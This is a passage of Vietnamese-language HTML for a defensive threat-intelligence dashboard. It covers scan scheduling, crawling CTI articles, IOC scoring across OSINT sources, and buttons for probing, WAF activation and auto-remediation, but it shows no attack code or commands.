            Dự án Web Application đối mặt trực tiếp với Internet công cộng &rarr; Đề xuất tối ưu: <b>Mỗi 6 giờ</b> (Mặc định).
          </div>
          <div style="display:flex; gap:12px; align-items:center; flex-wrap:wrap;">
            <label style="font-size:12.5px; font-weight:600; color:#1e293b;">Chu kỳ quét ngầm:</label>
            <select id="wzCadenceSelect" class="CleanSelect" style="font-weight:600; padding:6px 14px; font-size:13px; border-color:#93c5fd; background:#ffffff; color:#0f172a;" onchange="onWizardCadenceChange(this.value)">
              <option value="120">Mỗi 2 phút (Chế độ Demo / Kiểm thử nhanh)</option>
              <option value="300">Mỗi 5 phút (Kiểm thử tức thời)</option>
              <option value="900">Mỗi 15 phút (Quét PoC Exploit nóng)</option>
              <option value="3600">Mỗi 1 giờ (Giám sát liên tục)</option>
              <option value="21600" selected>Mỗi 6 giờ (Khuyến nghị chuẩn cho Web App - Mặc định)</option>
              <option value="43200">Mỗi 12 giờ (Dành cho Microservices/API)</option>
              <option value="86400">Mỗi 24 giờ / 1 ngày</option>
              <option value="259200">Mỗi 3 ngày (Endpoint)</option>
              <option value="604800">Mỗi 7 ngày (Hardware / IoT)</option>
            </select>
          </div>
        </div>

        <!-- 2. Mốc thời gian cào báo quá khứ -->
        <div style="background:#f8fafc; border:1px solid #cbd5e1; border-radius:8px; padding:16px; margin-bottom:20px;">
          <div style="font-size:13px; font-weight:700; color:#334155; margin-bottom:8px;">
            2. MỐC THỜI GIAN KHO TÌNH BÁO QUÁ KHỨ (HISTORY DEPTH)
          </div>
          <div style="display:flex; gap:20px; align-items:center; flex-wrap:wrap;">
            <label style="font-size:13px; cursor:pointer;"><input type="radio" name="wzHistory" value="1"> 1 Năm gần nhất (2025 - 2026)</label>
            <label style="font-size:13px; cursor:pointer;"><input type="radio" name="wzHistory" value="3" checked> 3 Năm (2024 - 2026, Khuyến nghị chuẩn)</label>
            <label style="font-size:13px; cursor:pointer;"><input type="radio" name="wzHistory" value="5"> 5 Năm (2022 - 2026, Deep Audit toàn diện)</label>
          </div>
        </div>

        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
          <button type="button" class="CleanBtn" style="padding:10px 18px; border:1px solid #cbd5e1; background:#ffffff; color:#334155; border-radius:6px; cursor:pointer;" onclick="wizardGotoStep(3)">
            &larr; Quay Lại Bước 3
          </button>
          <button type="button" class="CleanBtn btn-primary" style="padding:12px 28px; font-weight:700; background:#2563eb; color:#ffffff; border:none; border-radius:6px; cursor:pointer; box-shadow:0 4px 14px rgba(37,99,235,0.3);" onclick="wizardGotoStep(5)">
            [ TIẾP TỤC: CÀO BÁO &amp; ĐỐI SOÁT (BƯỚC 5) &rarr; ]
          </button>
        </div>
      </div>

      <!-- ============================================================== -->
      <!-- BƯỚC 5: CÀO BÁO & TỰ ĐỘNG NÂNG CẤP KỸ NĂNG TÁC TỬ SỐNG (LIVING SKILL) -->
      <!-- ============================================================== -->
      <!-- BƯỚC 5: LIVE CTI STREAMING & AST CORRELATION WORKSPACE         -->
      <!-- ============================================================== -->
      <div id="wizardCard5" class="WizardCard" style="display:none; padding:18px 22px; background:#eff6ff; border:1px solid #bfdbfe; border-radius:8px; margin-bottom:18px;">
        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:14px;">
          <div>
            <div style="font-size:15.5px; font-weight:700; color:#1e40af; display:flex; align-items:center; gap:8px;">
              <span>Bước 5: Cào Báo Tình Báo CTI &amp; Tự Động Nâng Cấp Kỹ Năng Tác Tử Sống</span>
              <span style="font-size:11.5px; background:#dcfce7; color:#15803d; border:1px solid #86efac; padding:2px 8px; border-radius:4px; font-weight:700;">GIAO DIỆN LIVE SERVER NGUYÊN BẢN</span>
            </div>
            <div style="font-size:13px; color:#3b82f6; margin-top:4px; line-height:1.5;">
              Hệ thống kích hoạt không gian Live Server nguyên bản: Danh sách bài báo CTI bên trái, trình đọc văn bản highlight nguyên bản bên phải và quản lý kho tri thức SQLite bên dưới.
            </div>
          </div>
          <div style="display:flex; gap:10px; align-items:center; flex-wrap:wrap;">
            <button type="button" class="CleanBtn" style="padding:9px 18px; font-size:13px; font-weight:600; background:#ffffff; color:#475569; border:1px solid #cbd5e1; border-radius:6px; cursor:pointer;" onclick="wizardGotoStep(4)">
              ← Quay Lại Bước 4
            </button>
            <button type="button" class="CleanBtn btn-primary" id="btnLiveStartScan" style="padding:9px 22px; font-size:13.5px; font-weight:700; background:#2563eb; color:#ffffff; border:none; border-radius:6px; cursor:pointer; box-shadow:0 2px 8px rgba(37,99,235,0.25);" onclick="startLiveServerCrawlStep5()">
              [ BẮT ĐẦU CÀO BÁO &amp; CHẠY AI LIVE ]
            </button>
            <button type="button" class="CleanBtn" id="btnStep5To6" style="padding:9px 22px; font-size:13.5px; font-weight:700; background:#16a34a; color:#ffffff; border:none; border-radius:6px; cursor:pointer; box-shadow:0 2px 8px rgba(22,163,74,0.25);" onclick="wizardGotoStep(6)">
              [ TIẾP TỤC: VÁ MÃ NGUỒN &amp; KIỂM THỬ THỰC CHIẾN (BƯỚC 6) → ]
            </button>
          </div>
        </div>
      </div>

      <!-- ============================================================== -->
      <!-- BƯỚC 6: VÁ MÃ NGUỒN, LỊCH SỬ & KIỂM THỬ WAF                     -->
      <!-- ============================================================== -->
      <div id="wizardCard6" class="WizardCard" style="display:none;">
        <h3 style="font-size:16px; margin-bottom:8px; color:#0f172a;">Bước 6: Vá Mã Nguồn Tự Hành, Lịch Sử &amp; Kiểm Thử WAF Thực Chiến</h3>
        <p style="color:#64748b; font-size:13px; margin-bottom:16px;">
          Quy trình 3 hành động kiểm thử khép kín: Thử nghiệm khai thác &rarr; Kích hoạt WAF &amp; Firewall &rarr; Tự động vá mã nguồn và tái kiểm thử xác nhận an toàn:
        </p>

        <!-- 3 Hành động thực thi -->
        <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(240px, 1fr)); gap:12px; margin-bottom:16px;">
          <div style="background:#fef2f2; border:1px solid #fecaca; border-radius:6px; padding:14px; text-align:center;">
            <b style="color:#991b1b; font-size:13px; display:block; margin-bottom:6px;">1. KIỂM THỬ KHAI THÁC</b>
            <p style="font-size:11.5px; color:#7f1d1d; margin-bottom:10px;">Gửi probe kiểm tra lỗ hổng RCE.</p>
            <button type="button" class="CleanBtn" style="font-size:12px; font-weight:700; padding:8px 14px; background:#b91c1c; color:#ffffff; border:none; border-radius:4px; cursor:pointer;" onclick="wizardRunProbe()">
              Chạy Thử Probe
            </button>
          </div>

          <div style="background:#eff6ff; border:1px solid #bfdbfe; border-radius:6px; padding:14px; text-align:center;">
            <b style="color:#1e40af; font-size:13px; display:block; margin-bottom:6px;">2. KÍCH HOẠT LÁ CHẮN</b>
            <p style="font-size:11.5px; color:#1e3a8a; margin-bottom:10px;">Bật WAF ModSecurity &amp; Firewall.</p>
            <button type="button" class="CleanBtn" style="font-size:12px; font-weight:700; padding:8px 14px; background:#2563eb; color:#ffffff; border:none; border-radius:4px; cursor:pointer;" onclick="wizardRunVirtualPatch()">
              Kích Hoạt WAF &amp; Netsh
            </button>
          </div>

          <div style="background:#f0fdf4; border:1px solid #bbf7d0; border-radius:6px; padding:14px; text-align:center;">
            <b style="color:#166534; font-size:13px; display:block; margin-bottom:6px;">3. TỰ ĐỘNG VÁ CODE</b>
            <p style="font-size:11.5px; color:#14532d; margin-bottom:10px;">Sửa code sang whitelist &amp; tái kiểm thử.</p>
            <button type="button" class="CleanBtn" style="font-size:12px; font-weight:700; padding:8px 14px; background:#15803d; color:#ffffff; border:none; border-radius:4px; cursor:pointer;" onclick="wizardRunRemediate()">
              Tự Động Vá Mã Nguồn
            </button>
          </div>
        </div>

        <!-- Terminal log kết quả hành động -->
        <div id="wzActionLogBox" style="background:#0f172a; color:#4ade80; font-family:monospace; font-size:12px; padding:14px; border-radius:6px; min-height:90px; max-height:160px; overflow-y:auto; border:1px solid #1e293b; line-height:1.6; margin-bottom:18px;">
          [SẴN SÀNG] Chọn một trong 3 hành động kiểm thử phía trên để tác tử AI thực thi trực tiếp trên hệ thống...
        </div>

        <!-- KHU VỰC TRUY CẬP LỊCH SỬ & DỮ LIỆU ĐÃ HỌC -->
        <div style="background:#f8fafc; border:1px solid #cbd5e1; border-radius:8px; padding:16px; margin-bottom:18px;">
          <b style="font-size:13px; color:#0f172a; display:block; margin-bottom:8px;">
            KHU VỰC TRUY CẬP DỮ LIỆU &amp; LỊCH SỬ HỆ THỐNG:
          </b>
          <div style="display:flex; gap:10px; flex-wrap:wrap;">
            <button type="button" class="CleanBtn" style="font-size:12px; font-weight:600; padding:8px 14px; background:#ffffff; color:#1d4ed8; border:1px solid #bfdbfe; border-radius:4px; cursor:pointer;" onclick="switchView('sec-history', document.querySelectorAll('.NavLink')[3])">
              [ Xem Toàn Bộ Lịch Sử Bài Báo Đã Học (<span id="step6HistoryCount">0</span>) ]
            </button>
            <button type="button" class="CleanBtn" style="font-size:12px; font-weight:600; padding:8px 14px; background:#ffffff; color:#15803d; border:1px solid #bbf7d0; border-radius:4px; cursor:pointer;" onclick="switchView('sec-score', document.querySelectorAll('.NavLink')[4])">
              [ Xem Bảng Điểm IOC 5 Nguồn OSINT ]
            </button>
            <button type="button" class="CleanBtn" style="font-size:12px; font-weight:600; padding:8px 14px; background:#ffffff; color:#7e22ce; border:1px solid #e9d5ff; border-radius:4px; cursor:pointer;" onclick="switchView('sec-defense', document.querySelectorAll('.NavLink')[5])">
              [ Xem Kho Kỹ Năng Tác Tử Phòng Thủ ]
            </button>
            <button type="button" class="CleanBtn" style="font-size:12px; font-weight:600; padding:8px 14px; background:#eff6ff; color:#2563eb; border:1px solid #93c5fd; border-radius:4px; cursor:pointer;" onclick="switchView('sec-chat', document.querySelectorAll('.NavLink')[6])">
              [ Chat Trực Tiếp Với AI Agent ]
            </button>
          </div>
        </div>

        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
          <button type="button" class="CleanBtn" style="padding:10px 18px; border:1px solid #cbd5e1; background:#ffffff; color:#334155; border-radius:6px; cursor:pointer;" onclick="wizardGotoStep(5)">
            &larr; Quay Lại Bước 5
          </button>
          <div style="display:flex; gap:10px; align-items:center;">
            <button type="button" class="CleanBtn" style="padding:10px 18px; border:1px solid #16a34a; background:#16a34a; color:#ffffff; font-weight:700; border-radius:6px; cursor:pointer;" onclick="finishWizardAndOpenLiveMonitoring()">
              [ Hoàn Tất &amp; Chuyển Sang Giám Sát Trực Tiếp Live AI ]
            </button>
            <button type="button" class="CleanBtn" style="padding:10px 18px; border:1px solid #fca5a5; background:#fef2f2; color:#b91c1c; border-radius:6px; cursor:pointer;" onclick="resetProjectDefense()">
              [ Thiết Lập Lại / Quét Lại Dự Án ]
            </button>
          </div>
        </div>
      </div>
    </section>

    <!-- MỤC 1: BÀI BÁO & HIGHLIGHT IOC -->
    <section class="CyberBox" id="sec-feed">
      <div class="BoxLegend">1. NGUỒN BÁO VÀ VĂN BẢN GỐC HIGHLIGHT</div>

      <!-- LIVE AI AGENT ACTIVITY TICKER -->
      <div class="LiveTickerBar">
        <span class="LivePulseDot"></span>
        <b style="color:var(--primary); font-size:12px; letter-spacing:0.04em;">NHẬT KÝ TÁC TỬ AI (LIVE STREAM):</b>
        <span id="liveTickerText" style="color:var(--text-main); font-size:13px; font-family:var(--font-mono); flex:1;">
          Hệ thống AI Agent đang sẵn sàng. Đang giám sát 6 nguồn OSINT thời gian thực...
        </span>
        <span id="liveTickerTime" style="color:var(--text-muted); font-size:11.5px; font-family:var(--font-mono);">
          Live
        </span>
      </div>

      <div class="ToolbarRow">
        <div style="display:flex; align-items:center; gap:10px; flex-wrap:wrap;">
          <span class="FieldLabel" style="margin:0;">LỌC NGUỒN:</span>
          <select class="CleanSelect" onchange="filterBySource(this.value, this)">
            <option value="ALL">Tất cả nguồn (Gộp 4 bài đầu)</option>
            <option value="NEW_ONLY">Bài mới quét live</option>
            <option value="TheHackerNews">TheHackerNews</option>
            <option value="Securelist">Securelist (Kaspersky)</option>
            <option value="Check Point">Check Point Research</option>
            <option value="SentinelOne">SentinelOne Labs</option>
            <option value="DFIR">The DFIR Report</option>
            <option value="CISA">CISA KEV (Mỹ)</option>
            <option value="YEAR_2026">Kho tri thức 2026 (3,087 bài &amp; CVEs)</option>
            <option value="YEAR_2025">Kho tri thức 2025 (2,094 bài &amp; CVEs)</option>
            <option value="YEAR_2024">Kho tri thức 2024 (1,948 bài &amp; CVEs)</option>
            <option value="OLD_ONLY">Kho lưu trữ bài cũ</option>
          </select>

          <span class="FieldLabel" style="margin:0; margin-left:6px;">HIỂN THỊ:</span>
          <select class="CleanSelect" id="feedStatusFilter" onchange="renderNewsGrid()">
            <option value="QUEUE" selected>Hàng đợi Live (Chờ &amp; Đang xử lý)</option>
            <option value="processing">Chỉ bài Đang xử lý...</option>
            <option value="pending">Chỉ bài Chờ xử lý</option>
            <option value="completed">Chỉ bài Đã xử lý (Xem lại)</option>
            <option value="ALL">Tất cả bài trong kho</option>
          </select>

          <button class="CleanBtn" id="btnQueueControl" onclick="toggleAutoQueueManual()">Dừng Hàng Đợi</button>
        </div>

        <div id="sourceWebsitesList" style="display:flex; gap:6px; flex-wrap:wrap;"></div>
      </div>

      <div class="SplitWorkspace">
        <div class="FeedColumn" id="newsGrid">
          <div style="padding:14px; color:var(--text-muted);">Đang tải danh sách bài báo...</div>
        </div>

        <div class="ReaderColumn" id="highlightViewerBox">
          <div class="ReaderHeader">
            <span>VĂN BẢN NGUYÊN BẢN TỪ BÁO CÁO GỐC</span>
            <div style="display:flex; gap:10px; font-size:11.5px;">
              <span style="color:var(--danger); font-weight:600;">[Độc hại IP1/C2]</span>
              <span style="color:var(--safe); font-weight:600;">[An toàn IP2]</span>
              <span style="color:var(--amber); font-weight:600;">[Lỗ hổng CVE]</span>
            </div>
          </div>
          <div class="ReaderBody" id="highlightedArticleView">Đang tải nội dung bài báo...</div>
        </div>
      </div>

      <div id="attackPairsBox" style="margin-top:12px; display:flex; flex-direction:column; gap:6px;"></div>
      <textarea id="articleText" style="display:none;"></textarea>
    </section>

    <!-- MỤC LỊCH SỬ BÀI BÁO ĐÃ HỌC & QUẢN LÝ KHO TRI THỨC -->
    <section class="CyberBox" id="sec-history">
      <div class="BoxLegend">LỊCH SỬ BÀI BÁO ĐÃ HỌC VÀ KHO TRI THỨC</div>

      <div class="HistoryStatsGrid">
        <div class="HistoryStatCard">
          <div class="HistoryStatLabel">KHO BÀI BÁO CTI THU THẬP</div>
          <div class="HistoryStatValue" id="statTotalArticles">0 bài</div>
          <div class="HistoryStatSub">Lưu trữ trong CSDL SQLite (Chờ phân tích)</div>
        </div>
        <div class="HistoryStatCard">
          <div class="HistoryStatLabel">TIẾN TRÌNH THỜI GIAN</div>
          <div class="HistoryStatValue mono" style="font-size:13.5px;" id="statDateRange">-- đến --</div>
          <div class="HistoryStatSub">Sắp xếp theo thứ tự thời gian</div>
        </div>
        <div class="HistoryStatCard">
          <div class="HistoryStatLabel">TIẾN ĐỘ PHÂN TÍCH TÁC TỬ</div>
          <div class="HistoryStatValue" style="font-size:14.5px;" id="statOldVsNew">0 Hoàn thành • 0 Chờ xử lý</div>
          <div class="HistoryStatSub">Tiến độ AI Agent phân tích bài báo</div>
        </div>
        <div class="HistoryStatCard">
          <div class="HistoryStatLabel">CHỈ SỐ IOC ĐÃ HỌC VÀ LƯU KHO</div>
          <div class="HistoryStatValue" id="statTotalIocs">0 IOC</div>
          <div class="HistoryStatSub" id="statIocBreakdown">0 IP • 0 Domain • 0 CVE</div>
        </div>
      </div>

      <div class="ToolbarRow" style="gap:10px;">
        <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
          <button class="CleanBtn" id="btnSortRecentDone" onclick="setHistorySort('RECENT_DONE', this)">Vừa Hoàn Thành</button>
          <button class="CleanBtn active" id="btnSortNewest" onclick="setHistorySort('NEWEST', this)">Từ Mới Đến Cũ</button>
          <button class="CleanBtn" id="btnSortOldest" onclick="setHistorySort('OLDEST', this)">Từ Cũ Đến Mới</button>
          <button class="CleanBtn" id="btnSortIoc" onclick="setHistorySort('IOC_DESC', this)">Nhiều IOC Nhất</button>

          <select class="CleanSelect" id="historyStatusFilter" onchange="renderHistoryManager()">
            <option value="COMPLETED">Chỉ bài đã Hoàn thành</option>
            <option value="HAS_HASH">Chỉ bài có Mã Băm Malware (SHA256/MD5)</option>
            <option value="HAS_IP">Chỉ bài có IP C2</option>
            <option value="HAS_CVE">Chỉ bài có Lỗ Hổng CVE</option>
            <option value="ALL" selected>Trạng thái: Tất cả bài báo</option>
            <option value="PENDING">Chỉ bài Chờ xử lý</option>
            <option value="HAS_IOC">Chỉ bài có bất kỳ IOC nào</option>
          </select>

          <select class="CleanSelect" id="historyScopeFilter" onchange="renderHistoryManager()">
            <option value="ALL">Phân hệ: Tất cả bài báo</option>
            <option value="SCOPE_WEB">Phân hệ Web &amp; API (SCOPE_WEB)</option>
            <option value="SCOPE_NETWORK">Phân hệ Mạng &amp; C2 (SCOPE_NETWORK)</option>
            <option value="SCOPE_ENDPOINT">Phân hệ Máy Trạm &amp; EDR (SCOPE_ENDPOINT)</option>
            <option value="SCOPE_HARDWARE">Phân hệ Phần Cứng &amp; IoT (SCOPE_HARDWARE)</option>
          </select>

          <select class="CleanSelect" id="historySourceFilter" onchange="renderHistoryManager()">
            <option value="ALL">Nguồn: Tất cả 6 nguồn quốc tế</option>
            <option value="TheHackerNews">TheHackerNews</option>
            <option value="Securelist">Kaspersky Securelist</option>
            <option value="Check Point">Check Point Research</option>
            <option value="SentinelOne">SentinelOne Labs</option>
            <option value="DFIR">The DFIR Report</option>
            <option value="CISA">CISA KEV (Mỹ)</option>
          </select>
        </div>

        <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap; flex:1; justify-content:flex-end;">
          <input
            type="text"
            id="historySearchInput"
            class="CleanInput"
            style="min-width:240px; padding:7px 12px;"
            placeholder="Tìm kiếm tiêu đề, IP, CVE, Domain..."
            oninput="renderHistoryManager()"
          />
          <button class="CleanBtn" id="btnCrawlYtd" style="border-color:var(--primary); color:var(--primary);" onclick="triggerCrawlYtd(this)">
            Quét Bổ Sung Dữ Liệu 2026
          </button>
          <button class="CleanBtn btn-primary" onclick="analyzeSelectedHistoryArticles()">
            Phân Tích Đã Chọn (<span id="histSelectedCount">0</span>)
          </button>
          <button type="button" class="CleanBtn" style="border-color:#fca5a5; color:#b91c1c; background:#fef2f2; font-weight:600; padding:4px 10px; font-size:12px; cursor:pointer;" onclick="resetAllArticlesToPending(this)" title="Đặt lại toàn bộ bài báo về trạng thái Chờ xử lý để AI Agent chạy lại từ đầu">
            [ Đặt Lại Toàn Bộ Về Chờ Xử Lý ]
          </button>
        </div>
      </div>

      <div class="TableWrap" style="max-height:420px; overflow-y:auto;">
        <table>
          <thead>
            <tr>
              <th style="width:74px;">
                <input type="checkbox" id="chkAllHistory" onchange="toggleSelectAllHistory(this.checked)" title="Chọn hoặc bỏ chọn tất cả" />
                STT
              </th>
              <th style="width:175px;">NGÀY ĐĂNG / QUÉT NẠP</th>
              <th style="width:150px;">NGUỒN BÁO</th>
              <th>TIÊU ĐỀ BÀI BÁO ĐÃ HỌC</th>
              <th style="width:260px;">CHỈ SỐ IOC TRONG BÀI</th>
              <th style="width:175px;">QUẢN LÝ</th>
            </tr>
          </thead>
          <tbody id="historyTableBody">
            <tr><td colspan="6" style="color:var(--text-muted);">Đang tải lịch sử các bài báo đã học...</td></tr>
          </tbody>
        </table>
      </div>
    </section>

    <!-- MỤC 2: BẢNG CHẤM ĐIỂM ĐA NGUỒN 5 LỚP -->
    <section class="CyberBox" id="sec-score">
      <!-- BANNER NGỮ CẢNH HỢP NHẤT (ĐỒNG BỘ MỤC 2 & MỤC 3) -->
      <div id="unifiedScopeBanner" class="UnifiedScopeBanner master">
        <div style="flex:1;">
          <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
            <span class="ScopeTag master" id="scopeTag">TOÀN BỘ KHO TRI THỨC</span>
            <b id="scopeTitle" style="font-size:14px; color:var(--text-main);">Ma Trận Phòng Thủ Hợp Nhất Đa Nguồn</b>
          </div>
          <div id="scopeSubtitle" style="font-size:12px; color:var(--text-muted); margin-top:4px;">
            Tổng hợp tri thức từ toàn bộ các bài báo trong kho CTI SQLite • Bao gồm đầy đủ IP, Domain, CVE và Mã Băm Malware (SHA256/MD5).
          </div>
        </div>
        <div style="display:flex; gap:8px; align-items:center;">
          <button class="CleanBtn btn-primary" id="btnScopeMaster" onclick="loadMasterDefenseMatrix()" style="font-weight:600;">
            Xem Toàn Bộ Kho CTI
          </button>
        </div>
      </div>

      <div class="BoxLegend" style="margin-bottom:12px;">2. HỢP NHẤT ĐA NGUỒN 5 LỚP (ALIENVAULT OTX • ABUSE.CH/VT • ABUSEIPDB/GREYNOISE • SHODAN)</div>

      <div class="AiBriefGrid">
        <div>
          <label class="FieldLabel">NHẬN ĐỊNH NGỮ CẢNH CỦA AI AGENT (LOCAL OLLAMA)</label>
          <div class="AiBriefBox" id="aiPlanBox">Đang chờ phân tích...</div>
        </div>
        <div>
          <label class="FieldLabel">KẾT LUẬN ĐỒNG THUẬN ĐA NGUỒN (SCORE &gt; 80 = CHẶN)</label>
          <div class="AiBriefBox" id="aiReasonBox">Đang chờ chấm điểm...</div>
        </div>
      </div>

      <!-- BỘ LỌC CHUYÊN BIỆT THEO LOẠI CHỈ SỐ IOC -->
      <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; margin-bottom:12px;">
        <div class="IocTypeFilterBar" style="margin-bottom:0;">
          <button class="IocTypeFilterBtn active" id="filterIocAll" onclick="filterScoreTableByType('ALL', this)">Tất Cả (<span id="countIocAll">0</span>)</button>
          <button class="IocTypeFilterBtn" id="filterIocHash" onclick="filterScoreTableByType('HASH', this)">Mã Băm Malware / Hash (<span id="countIocHash">0</span>)</button>
          <button class="IocTypeFilterBtn" id="filterIocIp" onclick="filterScoreTableByType('IP', this)">IP C2 (<span id="countIocIp">0</span>)</button>
          <button class="IocTypeFilterBtn" id="filterIocDomain" onclick="filterScoreTableByType('DOMAIN', this)">Tên Miền (<span id="countIocDomain">0</span>)</button>
          <button class="IocTypeFilterBtn" id="filterIocCve" onclick="filterScoreTableByType('CVE', this)">Lỗ Hổng CVE (<span id="countIocCve">0</span>)</button>
        </div>
        <span style="font-size:12px; color:var(--text-muted);" id="scoreTableNote">Hiển thị các chỉ số nguy hại đã đối chiếu qua 5 nguồn.</span>
      </div>

      <div class="TableWrap" style="max-height:480px; overflow-y:auto;">
        <table>
          <thead>
            <tr>
              <th style="min-width:240px;">CHỈ SỐ IOC</th>
              <th>VAI TRÒ</th>
              <th>ALIENVAULT OTX</th>
              <th>ABUSE.CH / VT</th>
              <th>ABUSEIPDB / GN</th>
              <th>SHODAN (PORT/CVE)</th>
              <th>ĐIỂM FUSION</th>
              <th>PHÁN QUYẾT</th>
              <th>ĐỐI CHIẾU</th>
            </tr>
          </thead>
          <tbody id="scoreTableBody">
            <tr><td colspan="9" style="color:var(--text-muted);">Đang chờ phân tích...</td></tr>
          </tbody>
        </table>
      </div>
    </section>

    <!-- MỤC 3: PHÒNG THỦ ĐA TẦNG & GIAO TIẾP FIREWALL -->
    <section class="CyberBox" id="sec-defense">
      <div class="BoxLegend" style="margin-bottom:12px;">3. KHO GÓI KỸ NĂNG TÁC TỬ PHÒNG THỦ TỰ HÀNH (AGENTIC DEFENSE SKILLS HUB)</div>

      <!-- KỸ NĂNG TỐI ƯU DUY NHẤT: PHÙ HỢP VỚI MÃ NGUỒN DỰ ÁN CỦA BẠN (TAILORED FOR YOUR CODEBASE) -->
      <div style="background:linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%); border:1px solid #86efac; border-radius:8px; padding:14px 18px; margin-bottom:14px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px; box-shadow:0 1px 3px rgba(0,0,0,0.03);">
        <div style="display:flex; align-items:center; gap:14px; flex-wrap:wrap;">
          <div style="background:#16a34a; color:#ffffff; font-weight:700; font-size:12.5px; padding:6px 12px; border-radius:6px; letter-spacing:0.03em; box-shadow:0 1px 2px rgba(0,0,0,0.08);">
            KỸ NĂNG PHÙ HỢP VỚI MÃ NGUỒN CỦA BẠN
          </div>
          <div>
            <div style="font-size:13.5px; color:#14532d; font-weight:700;">
              Dự án mục tiêu: <span id="lblActiveTargetProject" style="color:#0f172a; font-family:monospace; background:#ffffff; padding:2px 8px; border-radius:4px; border:1px solid #bbf7d0;">My_Website</span>
              <span style="margin-left:8px; font-size:12.5px; font-weight:600; color:#166534;">
                • Ngôn ngữ &amp; Stack: <span id="lblActiveTargetTechs" style="color:#15803d; font-weight:700;">Node.js, Express, React, Vite, MySQL2</span>
              </span>
            </div>
            <div style="font-size:12px; color:#166534; margin-top:3px;">
              [OK] Đã tự động phân tích mã nguồn &amp; loại bỏ 100% CTI / Phân hệ không liên quan (chỉ hiển thị duy nhất bộ kỹ năng phòng thủ khớp với công nghệ của bạn).
            </div>
          </div>
        </div>
        <div style="display:flex; align-items:center; gap:8px;">
          <button class="CleanBtn btn-primary" onclick="recompileActiveProjectSkill()" style="font-size:12px; padding:7px 16px; font-weight:700; background:#16a34a; border-color:#15803d;">
            Tải Lại Kỹ Năng Dự Án
          </button>
        </div>
      </div>

      <!-- 3 TAB CHÍNH CẤP 1 - THIẾT KẾ GRID KHÔNG BAO GIỜ BỊ RỚT DÒNG -->
      <div style="display:grid; grid-template-columns: 1fr 1fr 1.2fr; gap:8px; margin-bottom:12px;">
        <button id="mainTabBtn_skill" class="CleanBtn MasterTabBtn active" onclick="switchMasterTab('tabSkillMaster', this)" style="padding:10px 14px; font-size:12.5px; font-weight:700; color:#0969da; border-color:#0969da; background:var(--primary-subtle); text-align:center;">
          BỘ KỸ NĂNG TÁC TỬ (SKILL.md)
        </button>
        <button id="mainTabBtn_audit" class="CleanBtn MasterTabBtn" onclick="switchMasterTab('tabAuditMaster', this)" style="padding:10px 14px; font-size:12.5px; font-weight:700; color:#1a7f37; border-color:var(--border-main); background:#ffffff; text-align:center;">
          [OK] THẨM ĐỊNH TIN CẬY &amp; xAI (TRUST AUDIT)
        </button>
        <button id="mainTabBtn_engines" class="CleanBtn MasterTabBtn" onclick="switchMasterTab('tabEnginesMaster', this)" style="padding:10px 14px; font-size:12.5px; font-weight:700; color:var(--text-main); border-color:var(--border-main); background:#ffffff; text-align:center;">
          CÔNG CỤ THỰC THI &amp; KIỂM CHỨNG TÁC TỬ (AGENT PLAYBOOK &amp; PROBES)
        </button>
      </div>

      <!-- MASTER TAB 1: BỘ KỸ NĂNG TÁC TỬ (SKILL.md) -->
      <div id="tabSkillMaster" class="MasterTabPanel" style="display:block;">
        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; padding:12px 14px; margin-bottom:10px; border:1px solid var(--border-main); border-radius:6px; background:var(--bg-subtle);">
          <div>
            <span style="font-size:12px; font-weight:700; color:var(--primary); background:var(--primary-subtle); padding:3px 8px; border-radius:4px; border:1px solid #bfdbfe;">
              ĐÓNG GÓI CHUẨN AGENT DEFENSE SKILL (RFC / OPEN AGENT PROTOCOL)
            </span>
            <span style="font-size:12px; color:var(--text-muted); margin-left:8px;">
              Tệp: <b id="lblSkillMdFilename">SKILL.md (agentic-defense-master-web-suite)</b> • Sẵn sàng nạp cho 15 nền tảng AI Coding Agents
            </span>
          </div>
          <div style="display:flex; gap:8px;">
            <button class="CleanBtn" onclick="copySkillMdToClipboard()">Sao Chép SKILL.md</button>
            <button class="CleanBtn btn-primary" onclick="downloadSkillMdFile()">Tải Về Tệp SKILL.md</button>
          </div>
        </div>
        <pre id="outSkillMd" style="max-height:650px; overflow-y:auto; font-family:'JetBrains Mono',monospace; font-size:12px; line-height:1.45; background:#f6f8fa; color:#24292f; padding:14px; border:1px solid #d0d7de; border-radius:6px;">Đang biên dịch Bộ Kỹ Năng Tác Tử Phòng Thủ...</pre>
      </div>

      <!-- MASTER TAB 2: THẨM ĐỊNH TIN CẬY & xAI (HỢP NHẤT TOÀN DIỆN) -->
      <div id="tabAuditMaster" class="MasterTabPanel" style="display:none;">
        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; padding:12px 14px; margin-bottom:12px; border:1px solid var(--border-main); border-radius:6px; background:var(--bg-subtle);">
          <div>
            <span style="font-size:12px; font-weight:700; color:#1a7f37; background:#dafbe1; padding:3px 8px; border-radius:4px; border:1px solid #aceebb;">
              KHUNG KIỂM TOÁN ĐỘ TIN CẬY TOÁN HỌC &amp; VẾT GIẢI TRÌNH MINH BẠCH xAI
            </span>
            <span style="font-size:12px; color:var(--text-muted); margin-left:8px;">
              Chuẩn Zero-Hallucination CTI • Phân rã trọng số SHAP-Style &amp; Kiểm thử đối kháng 2 vòng
            </span>
          </div>
          <div>
            <button class="CleanBtn" onclick="recalculateTrustScore()">Tái Kiểm Thẩm Định</button>
          </div>
        </div>
        <div id="outUnifiedAudit" style="max-height:680px; overflow-y:auto; font-size:13px; line-height:1.6; color:#24292f;">
          <div id="outTrustAudit">Đang nạp hồ sơ kiểm toán độ tin cậy toán học...</div>
          <div id="outXAI" style="margin-top:20px;">Đang nạp vết giải trình minh bạch xAI...</div>
        </div>
      </div>

      <!-- MASTER TAB 3: 5 LỚP PHÒNG THỦ KỸ THUẬT & LIVE TEST -->
      <div id="tabEnginesMaster" class="MasterTabPanel" style="display:none;">
        <!-- THANH CHUYỂN SUB-TAB PHÒNG THỦ 1 DÒNG DUY NHẤT -->
